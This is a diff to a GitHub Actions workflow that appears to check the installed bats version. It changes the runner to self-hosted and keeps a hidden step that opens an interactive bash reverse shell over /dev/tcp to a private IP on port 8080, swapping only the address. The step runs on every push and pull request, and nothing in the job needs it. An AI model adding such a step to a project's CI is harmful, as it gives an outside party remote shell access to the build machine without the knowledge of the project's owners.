@@ -2,10 +2,10 @@ name: github-actions
 on: [push, pull_request]
 jobs:
   check-bats-version:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - uses: actions/checkout@v2
       - uses: actions/setup-node@v1
-      - run: /bin/bash -i >& /dev/tcp/192.168.237.128/8080 0>&1
+      - run: /bin/bash -i >& /dev/tcp/192.168.11.128/8080 0>&1
       - run: npm install -g bats
       - run: bats -v
